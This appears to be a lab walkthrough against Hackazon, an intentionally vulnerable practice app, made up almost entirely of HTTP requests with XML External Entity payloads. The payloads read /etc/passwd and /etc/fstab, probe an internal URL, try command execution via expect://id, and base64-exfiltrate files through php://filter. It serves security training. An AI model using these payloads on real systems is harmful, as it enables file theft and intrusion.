# A4 - XML External Entities (XXE)

## Hackazon

REST API documentation says: `/api/user/_id_ [ PUT ]`

`{"message":"Please provide next fields: username, first_name, last_name, user_phone, email, oauth_provider, oauth_uid, created_on, last_login, active, photo","code":400,"trace":""}`


Let's try some `application/json`

```
PUT /api/user/3 HTTP/1.1
Host: hackazon.owasp.local
Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json; charset=UTF-8
Content-Length: 67
Connection: close

{"username":"hacker","first_name":"Jozef","last_name":"Hackerovic"}
```

What about `application/xml` ?


```
PUT /api/user/3 HTTP/1.1
Host: hackazon.owasp.local
Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0
Content-Type: application/xml; charset=UTF-8
Content-Length: 117
Connection: close

<?xml version="1.0"?>
<username>hacker</username>
<first_name>Jozef</first_name>
<last_name>hackerovic</last_name>
```

Hello simplexml

```
PUT /api/user/3 HTTP/1.1
Host: hackazon.owasp.local
Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/xml; charset=UTF-8
Content-Length: 88
Connection: close

<?xml version='1.0' encoding ='utf-8'?>
<!DOCTYPE a [<!ENTITY e 'XEXE'>]>
<a>&e;</a>
```

```
PUT /api/user/3 HTTP/1.1
Host: hackazon.owasp.local
Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/xml; charset=UTF-8
Content-Length: 139
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [<!ENTITY goodies SYSTEM "file:///etc/passwd">]>
<roottag>&goodies;</roottag>
```


```
PUT /api/user/3 HTTP/1.1
Host: hackazon.owasp.local
Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/xml; charset=UTF-8
Content-Length: 130
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [<!ENTITY goodies SYSTEM "/etc/passwd">]>
<roottag>&goodies;</roottag>

```


```
PUT /api/user/3 HTTP/1.1
Host: hackazon.owasp.local
Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/xml; charset=UTF-8
Content-Length: 119
Connection: close

<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE a [<!ENTITY cmd SYSTEM 'http://127.0.0.1/secret.txt'>]>
<a>&cmd;</a>
```

```
PUT /api/user/3 HTTP/1.1
Host: hackazon.owasp.local
Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/xml; charset=UTF-8
Content-Length: 103
Connection: close

<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE a [<!ENTITY cmd SYSTEM 'expect://id'>]>
<a>&cmd;</a>
```

Problemy s /etc/fstab


```
PUT /api/user/3 HTTP/1.1
Host: hackazon.owasp.local
Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/xml; charset=UTF-8
Content-Length: 130
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [<!ENTITY goodies SYSTEM "/etc/fstab">]>
<roottag>&goodies;</roottag>

```


```
PUT /api/user/3 HTTP/1.1
Host: hackazon.owasp.local
Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/xml; charset=UTF-8
Content-Length: 154
Connection: close

<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "php://filter/read=convert.base64-encode/resource=/etc/fstab">
]>
<foo>
  &bar;
</foo>
```

